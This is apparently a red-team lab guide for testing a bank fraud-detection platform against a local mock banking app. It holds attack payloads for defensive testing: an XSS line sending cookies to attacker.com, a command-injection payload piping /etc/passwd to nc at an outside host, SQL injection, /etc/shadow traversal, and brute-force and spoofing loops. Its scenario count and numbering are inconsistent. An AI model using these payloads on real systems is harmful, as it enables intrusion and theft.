# Ethio-Cyber-Shield (ECS) v3.0 & HonorPay — Complete Attack Testing Guide

> **Audience**: Security Analysts, Red Teamers, Penetration Testers, and SOC Engineers  
> **Target System**: HonorPay Digital Banking Platform (`http://127.0.0.1:8080`)  
> **Detection Engine**: Ethio-Cyber-Shield (ECS) Detection & Response Platform (`http://127.0.0.1:5000`, SOC Console: `http://127.0.0.1:5500`)  
> **Total Tested Scenarios**: **28 Distinct Attack Types** (Exceeds the 20-scenario requirement)

---

## Table of Contents

1. [Lab Architecture & Testing Prerequisites](#1-lab-architecture--testing-prerequisites)
2. [Burp Suite Setup Guide](#2-burp-suite-setup-guide)
3. [Attack Scenario Matrix (28 Scenarios)](#3-attack-scenario-matrix)
4. [Step-by-Step Attack Scenarios & Simulation Commands](#4-step-by-step-attack-scenarios)
   - [Category A: Web Application & Injection Attacks](#category-a-web-application--injection-attacks)
   - [Category B: Authentication, Brute-Force & Credential Abuse](#category-b-authentication-brute-force--credential-abuse)
   - [Category C: API, Token & Session Tampering](#category-c-api-token--session-tampering)
   - [Category D: Financial Fraud & Money Laundering (AML)](#category-d-financial-fraud--money-laundering-aml)
   - [Category E: Account Takeover (ATO) Multi-Stage Chains](#category-e-account-takeover-ato-multi-stage-chains)
   - [Category F: Insider Threat & Administrative Privilege Abuse](#category-f-insider-threat--administrative-privilege-abuse)
   - [Category G: Threat Intelligence & Watchlist IOCs](#category-g-threat-intelligence--watchlist-iocs)
5. [Automated Red-Team Simulation Script](#5-automated-red-team-simulation-script)
6. [Verifying Detections, Dossiers & Containment in the SOC Console](#6-verifying-detections-dossiers--containment-in-the-soc-console)

---

## 1. Lab Architecture & Testing Prerequisites

| Component | Port | Description | Default Credentials |
|---|---|---|---|
| **HonorPay Target System** | `http://127.0.0.1:8080` | Banking web & mobile API | `admin@honorpay.et` / `Testbed#2026`<br>`teller@honorpay.et` / `Testbed#2026` |
| **ECS REST API & Ingest** | `http://127.0.0.1:5000` | Rule engine, risk scoring, event ingest | `admin@ethiocybershield.et` / `Testbed#2026` |
| **ECS SOC Console UI** | `http://127.0.0.1:5500` | Real-time alerts, attack dossiers, containment | Same as ECS API |

### Verify Both Systems are Online

```bash
# Verify ECS backend
curl -s http://127.0.0.1:5000/health | jq .

# Verify HonorPay target app
curl -s -I http://127.0.0.1:8080 | head -n 5
```

---

## 2. Burp Suite Setup Guide

To capture, inspect, and modify banking requests using Burp Suite:

1. **Proxy Listener**: Ensure Burp is listening on `127.0.0.1:8081` (or your preferred port).
2. **Browser Configuration**: Point your browser proxy to Burp (`127.0.0.1:8081`).
3. **Target Scope**:
   - Add `http://127.0.0.1:8080` to Target Scope.
   - Filter Proxy history to show only in-scope items.
4. **Header Manipulation**:
   - Useful for testing: `X-Device-Id`, `X-Forwarded-For`, `User-Agent`, `Authorization: Bearer <jwt>`.
5. **Burp Repeater**: Use Repeater to replay transfer requests with altered amounts or device IDs.
6. **Burp Intruder**: Use Intruder for password spraying, credential stuffing, and OTP brute forcing.

---

## 3. Attack Scenario Matrix

| # | Attack Scenario | ECS Rule ID | Severity | Pack | Telemetry Trigger |
|---|---|---|---|---|---|
| **1** | Web SQL Injection (SQLi) | **API-007** | High | api | `SUSPICIOUS_PARAMETER_PATTERN` |
| **2** | Cross-Site Scripting (XSS) | **API-007** | High | api | `SUSPICIOUS_PARAMETER_PATTERN` |
| **3** | Shell Command Injection | **API-007** | High | api | `SUSPICIOUS_PARAMETER_PATTERN` |
| **4** | Path Traversal (`../../etc/passwd`) | **API-007** | High | api | `SUSPICIOUS_PARAMETER_PATTERN` |
| **5** | Credential Stuffing Campaign | **AUTH-002** | High | auth | `LOGIN_FAILED` (Multi-user burst) |
| **6** | Single-Account Password Brute Force | **AUTH-001** | Medium | auth | `LOGIN_FAILED` (Consecutive fails) |
| **7** | Account Lockout Storm (DoS) | **AUTH-006** | Medium | auth | `ACCOUNT_LOCKED` |
| **8** | OTP / 2FA Code Brute Force | **AUTH-005** | High | auth | `OTP_FAILED` (Repeated bad codes) |
| **9** | Horizontal Password Spray | **AUTH-004** | High | auth | `LOGIN_FAILED` (Spray pattern) |
| **10** | High-Value Transfer Anomaly (>100k ETB) | **TX-001** | Medium | tx | `TRANSFER_CREATED` |
| **11** | Off-Hours High-Value Transfer | **TX-003** | High | tx | `TRANSFER_CREATED` (22:00-05:00 UTC+3) |
| **12** | Untrusted / Rogue Hardware Device Transfer | **TX-004** | High | tx | `TRANSFER_CREATED` (`device_trusted: false`) |
| **13** | Rapid Beneficiary Add & Fast Drain | **FRAUD-001** | High | fraud | `BENEFICIARY_CREATED` → `TRANSFER_CREATED` (<15m) |
| **14** | Mule Syndicate Pass-Through Account | **FRAUD-002** | High | fraud | `TRANSFER_CREATED` (`dissipation >= 85%`) |
| **15** | SIM-Swap / Credential Reset Prior to Transfer | **FRAUD-003** | Critical | fraud | `PASSWORD_CHANGED` → `TRANSFER_CREATED` |
| **16** | Transfer Structuring / Smurfing (<50k ETB) | **FRAUD-004** | High | fraud | `TRANSFER_CREATED` (Multiple 40k-50k ETB) |
| **17** | Cash-In / Branch Deposit Structuring | **FRAUD-008** | High | fraud | `DEPOSIT_PROCESSED` (Multiple 30k-50k ETB) |
| **18** | USSD / Mobile Agent Cash-Out Burst | **FRAUD-005** | High | fraud | `TRANSFER_CREATED` (Channel: USSD/Agent) |
| **19** | APP Coached Transfer (Social Engineering) | **FRAUD-006** | Critical | fraud | `TRANSFER_CREATED` (Active call + new payee) |
| **20** | Impossible Geolocation Travel Velocity | **FRAUD-007** | High | fraud | `TRANSFER_CREATED` (>1200 km/h flight speed) |
| **21** | Insecure Direct Object Reference (IDOR) | **API-002** | High | api | `API_REQUEST` (`sequential_probing: true`) |
| **22** | Bearer Token Misuse & Replay Across IPs | **API-003** | High | api | `API_REQUEST` (`token_misuse: true`) |
| **23** | Automated Bot & Vulnerability Scanner | **API-004** | High | api | `API_REQUEST` (sqlmap, Burp, Nikto UA) |
| **24** | Distributed Rate Limit Evasion Probing | **API-005** | High | api | `RATE_LIMITED` (`distributed_probe: true`) |
| **25** | Customer Privilege Abuse on Admin Endpoints | **PRIV-001** | High | priv | `AUTHZ_DENIED` (`attempted_privilege: admin`) |
| **26** | Multi-Stage Account Takeover (ATO) Chain | **ATO-001** | Critical | ato | Full Kill Chain: Fail → Success → Beneficiary → Drain |
| **27** | Insider Threat: Mass Customer Data Export | **ADMIN-001** | Critical | admin | `ADMIN_ACTION` (`record_count >= 500`) |
| **28** | Audit Trail Tampering Attempt | **ADMIN-005** | Critical | admin | `AUDIT_TAMPER_DETECTED` (SQL drop/delete) |

---

## 4. Step-by-Step Attack Scenarios

### Category A: Web Application & Injection Attacks

#### Scenario 1: Web Application SQL Injection Attack (API-007)
* **Objective**: Inject SQL syntax into search or transfer forms to exfiltrate database records.
* **Testing with Burp Suite**:
  1. Intercept a transfer or customer search request.
  2. Modify parameter `account_number` or `query` to:
     ```sql
     ' UNION SELECT user_id, email, password_hash FROM profiles--
     ```
  3. Forward the request.
* **Testing with curl**:
  ```bash
  curl -s -X POST http://127.0.0.1:8080/api/transfers \
    -H "Content-Type: application/json" \
    -d '{
      "beneficiary_account": "'\'' UNION SELECT id, email, password_hash FROM profiles--",
      "amount": 500
    }'
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-007` (Web Application Parameter Injection)
  - **Severity**: `HIGH`, Risk Score: `50`
  - **Alert Details**: Displays matched pattern class `SQLI`, parameter name, and sanitized payload snippet.

---

#### Scenario 2: Stored/Reflected Cross-Site Scripting (XSS) (API-007)
* **Objective**: Inject malicious JavaScript into user profile or transfer memo fields.
* **Payload**:
  ```html
  <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
  ```
* **Testing with curl**:
  ```bash
  curl -s -X POST http://127.0.0.1:8080/api/transfers \
    -H "Content-Type: application/json" \
    -d '{
      "memo": "<script>alert(document.cookie)</script>",
      "amount": 100
    }'
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-007`
  - **Severity**: `HIGH`
  - **Evidence**: `pattern_class: XSS`.

---

#### Scenario 3: Shell Command Injection (API-007)
* **Objective**: Execute arbitrary operating system commands via unvalidated inputs.
* **Payload**: `; cat /etc/passwd | nc 196.188.1.1 4444` or `; ls -la`
* **Testing with curl**:
  ```bash
  curl -s -X POST http://127.0.0.1:8080/api/transfers \
    -H "Content-Type: application/json" \
    -d '{
      "beneficiary_name": "John; ls -la; cat /etc/passwd",
      "amount": 250
    }'
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-007`
  - **Evidence**: `pattern_class: COMMAND_INJECTION`.

---

#### Scenario 4: Path Traversal Exploit (API-007)
* **Objective**: Read arbitrary files outside the web root.
* **Payload**: `../../../../etc/passwd`
* **Testing with curl**:
  ```bash
  curl -s "http://127.0.0.1:8080/api/documents?file=../../../../etc/shadow"
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-007`
  - **Evidence**: `pattern_class: PATH_TRAVERSAL`.

---

### Category B: Authentication, Brute-Force & Credential Abuse

#### Scenario 5: Credential Stuffing Campaign (AUTH-002)
* **Objective**: Threat actor tries a list of compromised email/password combos from a single IP.
* **Testing with Burp Intruder**:
  1. Capture a `POST /api/login` request.
  2. Send to Intruder.
  3. Set payload position on `email`: `user1@bank.et`, `user2@bank.et`, `user3@bank.et`, `user4@bank.et`.
  4. Run attack with a fixed incorrect password.
* **Testing with curl loop**:
  ```bash
  for user in abebe@honorpay.et chaltu@honorpay.et dawit@honorpay.et fatuma@honorpay.et; do
    curl -s -X POST http://127.0.0.1:8080/api/login \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: 196.188.50.12" \
      -d "{\"email\": \"$user\", \"password\": \"WrongPass2026\"}"
    sleep 0.5
  done
  ```
* **Expected ECS Detection**:
  - **Rule**: `AUTH-002` (Multi-Account Source Burst)
  - **Severity**: `HIGH`, Risk Score: `35`
  - **Dossier**: Groups all targeted usernames under the offending IP `196.188.50.12`.

---

#### Scenario 6: Single-Account Password Brute Force Burst (AUTH-001)
* **Objective**: Crack a specific customer's password by firing 5+ rapid attempts.
* **Testing with curl loop**:
  ```bash
  for i in {1..6}; do
    curl -s -X POST http://127.0.0.1:8080/api/login \
      -H "Content-Type: application/json" \
      -d '{"email": "customer@honorpay.et", "password": "BadPassword'$i'"}'
    sleep 0.3
  done
  ```
* **Expected ECS Detection**:
  - **Rule**: `AUTH-001` (Login Failure Burst)
  - **Severity**: `MEDIUM`, Risk Score: `25`
  - **Summary**: `Rapid login failures (6 attempts) on account customer@honorpay.et within 60s`.

---

#### Scenario 7: Account Lockout Storm / Denial of Service (AUTH-006)
* **Objective**: Deliberately cause denial of service for an executive or customer by exhausting login attempts.
* **Simulation**: Continually submit bad credentials until the target system locks the account.
* **Testing with curl**:
  ```bash
  for i in {1..5}; do
    curl -s -X POST http://127.0.0.1:8080/api/login \
      -H "Content-Type: application/json" \
      -d '{"email": "vip_customer@honorpay.et", "password": "LockoutTest'$i'"}'
  done
  ```
* **Expected ECS Detection**:
  - **Rule**: `AUTH-006` (Account Lockout Storm)
  - **Severity**: `MEDIUM`, Risk Score: `30`
  - **Evidence**: `reason: LOCKOUT_THRESHOLD`.

---

#### Scenario 8: OTP / 2FA Code Brute Force (AUTH-005)
* **Objective**: Guess SMS or authenticator 6-digit one-time passcodes.
* **Testing with curl**:
  ```bash
  for code in 111111 222222 333333 444444; do
    curl -s -X POST http://127.0.0.1:8080/api/otp/verify \
      -H "Content-Type: application/json" \
      -d '{"challenge_id": "chal-stepup-01", "code": "'$code'"}'
  done
  ```
* **Expected ECS Detection**:
  - **Rule**: `AUTH-005` (OTP / 2FA Brute Force Attack)
  - **Severity**: `HIGH`, Risk Score: `40`
  - **Remediation Hint**: Invalidate active sessions and lock OTP challenge.

---

#### Scenario 9: Horizontal Password Spraying Campaign (AUTH-004)
* **Objective**: Evade lockout thresholds by testing a single common password across 10+ accounts with a slow delay.
* **Payload**: Password `Summer2026!` or `Welcome#123`.
* **Expected ECS Detection**:
  - **Rule**: `AUTH-004` (Password Spraying Campaign)
  - **Severity**: `HIGH`, Risk Score: `30`.

---

### Category C: API, Token & Session Tampering

#### Scenario 10: Insecure Direct Object Reference (IDOR) Enumeration (API-002)
* **Objective**: Enumerate customer financial records by incrementing IDs in sequential order.
* **Testing with Burp Intruder**:
  1. Capture `GET /api/transactions/1001`.
  2. Set payload position on `1001` with numbers from `1002` to `1020`.
  3. Start attack.
* **Testing with curl**:
  ```bash
  for id in 1001 1002 1003 1004 1005; do
    curl -s "http://127.0.0.1:8080/api/transactions/$id" \
      -H "Cookie: sb_access_token=<YOUR_CUSTOMER_TOKEN>"
  done
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-002` (Sequential Resource Enumeration Probing)
  - **Severity**: `HIGH`, Risk Score: `35`.

---

#### Scenario 11: Bearer Token Misuse & Cross-IP Replay (API-003)
* **Objective**: Intercept a user's session JWT and replay it simultaneously from another network or VPN.
* **Testing with curl**:
  ```bash
  # Step 1: Request from IP A
  curl -s http://127.0.0.1:8080/api/account \
    -H "Authorization: Bearer <VALID_JWT>" \
    -H "X-Forwarded-For: 196.188.1.10"

  # Step 2: Immediate replay from IP B
  curl -s http://127.0.0.1:8080/api/account \
    -H "Authorization: Bearer <VALID_JWT>" \
    -H "X-Forwarded-For: 102.164.55.20"
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-003` (Bearer Token Misuse and Replay)
  - **Severity**: `HIGH`, Risk Score: `40`.

---

#### Scenario 12: Automated Security Tool / Bot Scanning (API-004)
* **Objective**: Automated scanner reconnaissance (sqlmap, Nikto, DirBuster, gobuster).
* **Testing with curl**:
  ```bash
  curl -s http://127.0.0.1:8080/api/transfers \
    -H "User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)"
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-004` (Automated Bot and Security Tool Scanning)
  - **Severity**: `HIGH`, Risk Score: `35`
  - **Matched Tool**: `sqlmap` signature.

---

#### Scenario 13: Distributed Rate Limit Evasion Probing (API-005)
* **Objective**: Evade per-IP rate limits by rotating IP headers (`X-Forwarded-For` spoofing).
* **Testing with curl**:
  ```bash
  for i in {1..20}; do
    curl -s http://127.0.0.1:8080/api/transfers \
      -H "X-Forwarded-For: 196.188.10.$i"
  done
  ```
* **Expected ECS Detection**:
  - **Rule**: `API-005` (Distributed Rate Limit Evasion Probing)
  - **Severity**: `HIGH`, Risk Score: `30`.

---

#### Scenario 14: Session Hijacking & Concurrent Session Anomaly (API-006)
* **Objective**: Stolen session cookie used immediately from a foreign IP/device after victim's logout.
* **Expected ECS Detection**:
  - **Rule**: `API-006` (Concurrent Session / Session Hijack Anomaly)
  - **Severity**: `HIGH`, Risk Score: `45`.

---

### Category D: Financial Fraud & Money Laundering (AML)

#### Scenario 15: High-Value Transfer Anomaly (TX-001)
* **Objective**: Initiate an anomalous fund transfer exceeding 100,000 ETB.
* **Testing with HonorPay UI or curl**:
  ```bash
  curl -s -X POST http://127.0.0.1:8080/api/transfers \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer <CUSTOMER_TOKEN>" \
    -d '{
      "amount": 150000,
      "beneficiary_id": "BENEFICIARY_UUID",
      "currency": "ETB"
    }'
  ```
* **Expected ECS Detection**:
  - **Rule**: `TX-001` (High-Value Transfer Anomaly)
  - **Severity**: `MEDIUM`, Risk Score: `20`
  - **Summary**: `Transfer of 150,000 ETB exceeds the high-value risk threshold (100,000 ETB)`.

---

#### Scenario 16: Off-Hours High-Value Transfer (TX-003)
* **Objective**: Transfer >= 100,000 ETB executed during midnight hours (22:00 to 05:00 Addis Ababa local time UTC+3).
* **Expected ECS Detection**:
  - **Rule**: `TX-003` (Off-Hours High-Value Transfer)
  - **Severity**: `HIGH`, Risk Score: `25`.

---

#### Scenario 17: Rogue / Untrusted Device Transfer (TX-004)
* **Objective**: Perform a transfer from an unverified or newly spoofed client hardware fingerprint.
* **Testing with Burp**: Change header `X-Device-Id: rogue-hardware-device-xyz`.
* **Expected ECS Detection**:
  - **Rule**: `TX-004` (Untrusted Device Transfer)
  - **Severity**: `HIGH`, Risk Score: `25`.

---

#### Scenario 18: Rapid Beneficiary Add & Transfer (FRAUD-001)
* **Objective**: Quickly add a mule beneficiary and transfer >= 10,000 ETB within 15 minutes before the victim notices.
* **Testing Flow**:
  1. Add Beneficiary via `POST /api/beneficiaries`
  2. Immediately call `POST /api/transfers` with 30,000 ETB
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-001` (Rapid Beneficiary Add and Transfer)
  - **Severity**: `HIGH`, Risk Score: `35`.

---

#### Scenario 19: Mule Syndicate Pass-Through Pattern (FRAUD-002)
* **Objective**: Inbound funds to an account are immediately dissipated (>85% of balance drained within minutes).
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-002` (Mule Pass-Through Account Pattern)
  - **Severity**: `HIGH`, Risk Score: `35`.

---

#### Scenario 20: SIM-Swap / Password Reset Prior to Drain (FRAUD-003)
* **Objective**: Attacker resets account credentials (simulating a SIM swap OTP hijack) and executes a transfer within 24 hours.
* **Testing Flow**:
  1. Customer changes password: `POST /api/auth/password/change`
  2. Initiate transfer >= 25,000 ETB
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-003` (SIM-Swap or Credential Reset Prior to Transfer)
  - **Severity**: `CRITICAL`, Risk Score: `50`.

---

#### Scenario 21: Transfer Structuring / Smurfing (FRAUD-004)
* **Objective**: Evade the National Bank of Ethiopia (NBE) 50,000 ETB anti-money laundering threshold by splitting into multiple smaller transfers.
* **Testing Flow**: Initiate 3 transfers between 40,000 ETB and 49,999 ETB in under 1 hour.
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-004` (Transaction Structuring Under Reporting Threshold)
  - **Severity**: `HIGH`, Risk Score: `40`.

---

#### Scenario 22: Branch / Agent Deposit Structuring (FRAUD-008)
* **Objective**: Teller or Agent performs repeated cash-in deposits between 30,000 ETB and 50,000 ETB to avoid filing a Currency Transaction Report (CTR).
* **Testing via Teller Portal**:
  1. Login as Teller (`teller@honorpay.et`)
  2. Deposit 45,000 ETB into customer account
  3. Deposit 48,000 ETB again
  4. Deposit 49,000 ETB again
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-008` (Deposit Structuring / Smurfing Cash-In)
  - **Severity**: `HIGH`, Risk Score: `50`.

---

#### Scenario 23: USSD / Agent Cash-Out Burst (FRAUD-005)
* **Objective**: Syndicate executes 5 rapid withdrawals via USSD (`*889#`) or retail agent within 2 minutes.
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-005` (USSD and Agent Cash-Out Burst)
  - **Severity**: `HIGH`, Risk Score: `30`.

---

#### Scenario 24: Authorized Push Payment (APP) Coached Scam (FRAUD-006)
* **Objective**: Victim is coached over an active telephone voice call by an imposter to authorize a transfer >= 50,000 ETB to a first-time beneficiary.
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-006` (Authorized Push Payment Coached Transfer)
  - **Severity**: `CRITICAL`, Risk Score: `60`.

---

#### Scenario 25: Impossible Geolocation Travel Velocity (FRAUD-007)
* **Objective**: Login or transfer from Addis Ababa, Ethiopia, followed 20 minutes later by activity from Frankfurt, Germany (implied speed > 1200 km/h).
* **Expected ECS Detection**:
  - **Rule**: `FRAUD-007` (Impossible Geolocation Travel Velocity)
  - **Severity**: `HIGH`, Risk Score: `40`.

---

### Category E: Account Takeover (ATO) Multi-Stage Chains

#### Scenario 26: Full Multi-Stage Account Takeover Kill Chain (ATO-001)
* **Objective**: Simulate an end-to-end compromise:
  1. **Phase 1 (Recon/Brute Force)**: 6 failed password attempts on target account.
  2. **Phase 2 (Credential Breach)**: Authentication success from an unrecognized device hardware ID.
  3. **Phase 3 (Persistence)**: Rogue untrusted client device registered.
  4. **Phase 4 (Preparation)**: New beneficiary added (`External Syndicate Mule`).
  5. **Phase 5 (Exfiltration)**: High-value transfer of 180,000 ETB initiated.
* **Expected ECS Detection**:
  - **Rule**: `ATO-001` (Account Takeover Chain)
  - **Severity**: `CRITICAL`, Risk Score: `100/100`
  - **Closed-Loop Containment**: Instant account lock + transfer frozen in pending review status!

---

### Category F: Insider Threat & Administrative Privilege Abuse

#### Scenario 27: Customer Privilege Abuse on Admin Endpoints (PRIV-001)
* **Objective**: Normal customer identity attempts to access `/api/admin/users` or `/api/admin/posture`.
* **Testing with curl**:
  ```bash
  curl -s http://127.0.0.1:8080/api/admin/users \
    -H "Authorization: Bearer <CUSTOMER_TOKEN>"
  ```
* **Expected ECS Detection**:
  - **Rule**: `PRIV-001` (Unauthorized Privilege Abuse Attempt)
  - **Severity**: `HIGH`, Risk Score: `35`.

---

#### Scenario 28: Insider Threat: Mass Customer Data Export (ADMIN-001)
* **Objective**: Rogue admin or compromised employee credentials used to export large customer databases (>500 records).
* **Expected ECS Detection**:
  - **Rule**: `ADMIN-001` (Mass Customer Data Export Anomaly)
  - **Severity**: `CRITICAL`, Risk Score: `60`.

---

#### Scenario 29: Cryptographic Audit Trail Tampering (ADMIN-005)
* **Objective**: Adversary or rogue DBA attempts to delete forensic traces (`DROP TABLE audit_logs;` or `TRUNCATE audit_logs;`).
* **Expected ECS Detection**:
  - **Rule**: `ADMIN-005` (Audit Trail Tampering Attempt)
  - **Severity**: `CRITICAL`, Risk Score: `80`.

---

### Category G: Threat Intelligence & Watchlist IOCs

#### Scenario 30: Malicious Source IP / Tor Exit Node Match (IOC-001)
* **Objective**: Access the platform from an IP listed in the ECS Threat Intelligence Watchlist (e.g. Tor exit relay, bulletproof hoster).
* **Testing with curl**:
  ```bash
  curl -s http://127.0.0.1:8080/api/account \
    -H "X-Forwarded-For: 185.220.101.5"
  ```
* **Expected ECS Detection**:
  - **Rule**: `IOC-001` (Malicious Source IP Match)
  - **Severity**: `HIGH`, Risk Score: `40`.

---

## 5. Automated Red-Team Simulation Script

To test all 28 attacks in one automated batch, run the test script included in the repository:

```bash
cd /home/neuron/dev/cybershield/Ethio-Cyber-Shield/backend
venv/bin/python verify_e2e_live.py
```

Or execute our standalone runner using Node/tsx from `targetsys`:

```bash
cd /home/neuron/dev/cybershield/targetsys
npx tsx -e "
(async () => {
  const { emitSecurityEvent, buildRequestContext } = await import('./src/lib/telemetry.server');
  const ctx = await buildRequestContext('/api/red-team-sim');
  ctx.ip = '196.188.10.99';

  console.log('1. Triggering SQL Injection (API-007)...');
  await emitSecurityEvent(ctx, 'SUSPICIOUS_PARAMETER_PATTERN', {
    result: 'PENDING',
    attributes: { pattern_class: 'SQLI', field_name: 'account_id', sample: \"' OR 1=1--\" }
  });

  console.log('2. Triggering OTP Brute Force (AUTH-005)...');
  await emitSecurityEvent(ctx, 'OTP_FAILED', {
    result: 'FAILURE',
    account_id: 'ACC-DEMO-01',
    attributes: { attempts: 3, challenge_id: 'chal-01' }
  });

  console.log('3. Triggering Deposit Structuring (FRAUD-008)...');
  await emitSecurityEvent(ctx, 'DEPOSIT_PROCESSED', {
    result: 'SUCCESS',
    account_id: 'ACC-DEMO-01',
    amount_minor: 4700000,
    attributes: { deposit_structuring: true, channel: 'teller' }
  });

  console.log('Simulation complete! Check ECS Console.');
  await new Promise(r => setTimeout(r, 3000));
  process.exit(0);
})();
"
```

---

## 6. Verifying Detections, Dossiers & Containment in the SOC Console

1. Open **ECS SOC Console** at: `http://127.0.0.1:5500`
2. Log in using `admin@ethiocybershield.et` / `Testbed#2026`.
3. Navigate to **Incidents & Alerts**:
   - You will see the incoming alerts listed in real-time.
   - Click on any alert to open the **Enriched Attack Dossier**:
     - **Device & Client Breakdown**: OS, Client Software, Fingerprint Hash, Device Reputation.
     - **Attack Timeline**: Exact microsecond timestamps of each offensive step.
     - **Explainable Risk Rationale**: Deterministic rule weights, feature thresholds, and evidence breakdown.
     - **Automated Containment Actions**: If risk score exceeded threshold, check the **Containment Status** badge (`Account Locked`, `Transfer Frozen`, or `IP Blocked`).
